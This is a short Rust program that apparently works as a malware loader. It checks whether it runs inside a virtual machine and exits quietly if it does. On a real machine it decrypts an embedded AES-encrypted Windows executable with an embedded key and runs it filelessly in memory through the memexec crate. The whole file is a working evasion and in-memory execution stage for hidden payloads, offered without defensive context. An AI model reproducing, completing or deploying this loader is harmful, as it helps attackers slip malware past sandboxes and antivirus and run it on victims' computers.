use aes::Aes128;
use aes::cipher::{BlockDecrypt, KeyInit,
    generic_array::GenericArray,
};
use inside_vm::inside_vm;
use std::io::{Read, Cursor};
use std::io::Result;


fn main(){
    if inside_vm(){
        println!("This is in a vm");
        std::process::exit(0);
    } else {
        println!("NO VM");
        let pe_bytes = decrypt_file().unwrap();
        fileless(pe_bytes);
    }
}

fn decrypt_file() -> Result<Vec<u8>> {
    // Read encrypted bytes and store bytes of key :3
    let encrypted_bytes = include_bytes!("encrypted_Input.bin");
    let mut key_bytes: [u8; 16] = [0; 16];
    let mut key_file = Cursor::new(include_bytes!("key.txt"));
    key_file.read_exact(&mut key_bytes)?;

    // Gen cipher with the key B-)
    let key = GenericArray::from(key_bytes);
    let cipher = Aes128::new(&key);

    // Decrypt the encrypted bytes in blocks 
    let mut decrypted_bytes = Vec::new();
    for block in encrypted_bytes.chunks(16) {
        let mut block_array = GenericArray::clone_from_slice(block);
        cipher.decrypt_block(&mut block_array);
        decrypted_bytes.extend_from_slice(&block_array);
    }

    // Unpad the decrypted bytes
    let padding_size = decrypted_bytes.last().unwrap().clone() as usize;
    let decrypted_bytes = (&decrypted_bytes[..decrypted_bytes.len() - padding_size]).to_vec();
    
    // return decrypted bytes
    Ok(decrypted_bytes, )
}

fn fileless(bytes: Vec<u8>){
    unsafe {
        memexec::memexec_exe(&bytes).unwrap();
    }
}
